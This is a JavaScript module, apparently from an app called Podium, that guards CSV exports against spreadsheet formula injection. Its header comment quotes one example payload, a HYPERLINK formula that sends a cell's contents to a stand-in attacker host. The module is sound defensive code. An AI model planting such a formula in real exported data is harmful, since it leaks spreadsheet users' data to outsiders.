// One CSV cell, safe to open in a spreadsheet.
//
// Every CSV Podium writes ends up in Excel, Numbers or Google Sheets, and
// several carry text a stranger typed: a poll answer, a guest's name at
// check-in, a parking-lot question, the user agent on a failed sign-in. A
// cell starting with = + - or @ is read by those programs as a formula, so
// `=HYPERLINK("https://evil.example/?"&A1,"Click")` typed into a poll is a
// working formula in the instructor's grade sheet. Such a cell is written
// with a leading apostrophe - the spreadsheet convention for "this is text"
// - unless it is just a number (-3, +1.5), which is left as one.
//
// Mirrored for the pages' own exports by csvCell in assets/js/util.js.

'use strict';

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;

/** The value as text a spreadsheet will not run. */
function neutralise(value) {
  const text = String(value ?? '');
  return FORMULA_START.test(text) && !PLAIN_NUMBER.test(text) ? `'${text}` : text;
}

/** One field: neutralised, and quoted when it has to be. */
function csvField(value) {
  const text = neutralise(value);
  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

const csvLine = (fields) => fields.map(csvField).join(',');

/** A field read back from a CSV this wrote: the guard apostrophe comes off. */
const unguard = (text) => (/^'[=+\-@\t\r]/.test(text) ? text.slice(1) : text);

module.exports = { neutralise, csvField, csvLine, unguard };
